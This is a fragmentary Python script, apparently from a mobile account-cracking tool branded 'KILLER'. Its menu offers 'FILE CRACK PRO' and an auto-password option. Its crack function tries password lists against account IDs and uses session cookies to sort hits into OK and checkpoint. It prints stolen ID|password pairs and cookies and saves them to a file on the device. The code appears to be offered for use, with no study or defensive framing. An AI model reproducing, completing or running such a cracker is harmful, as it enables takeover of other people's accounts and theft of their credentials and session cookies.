...
def menu():
    ...
    print('')
    print('')
    print(' \x1b[1;37m[\x1b[1;92m01\x1b[1;37m] \x1b[1;37mFILE CRACK [\x1b[1;92m PRO \x1b[1;37m] ')
    print('')
    print('')
    sale = input(' \x1b[1;37mHALBZHERA = ')
    print('')
    if sale in ('1', '01'):
        File()
        back()
...
def setting():
    ...
    if hc in ['1','01']:
        ...
        print('')
        print('')
    pwplus=input(' \x1b\x1b[1;33mAutoPassword \x1b[1;37m[ 1 ] \x1b[1;33m= ')
    if pwplus in ['y','Y']:
        pwpluss.append('ya')
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f'\r \x1b[1;97m[ \x1b[1;97mKILLER \x1b[1;37m] \x1b[1;37m(\x1b[1;92mOK\x1b[1;30m-\x1b[1;93mCP\x1b[1;37m) \x1b[1;37m(\x1b[1;32m{ok}\x1b[1;30m-\x1b[1;33m{cp}\x1b[1;37m)\x1b[1;30m =\x1b[1;37m {loop}  ');sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\x1b[1;33m[ KILLER\x1b[1;33m ] \x1b[1;33m {idf} | {pw}\n[UserAgent]>{ua}')
                ...
                print(f'\r\x1b[1;32m[ KILLER\x1b[1;32m ] \x1b[1;92m {idf} | {pw} \n[COOKIES] {kuki} | \nUseragent\x1b[1;37m:\x1b[1;92m{ua}')
                open('/storage/emulated/0/KILLER-OK/' + okc, 'a').write(idf + '|' + pw + '\n')
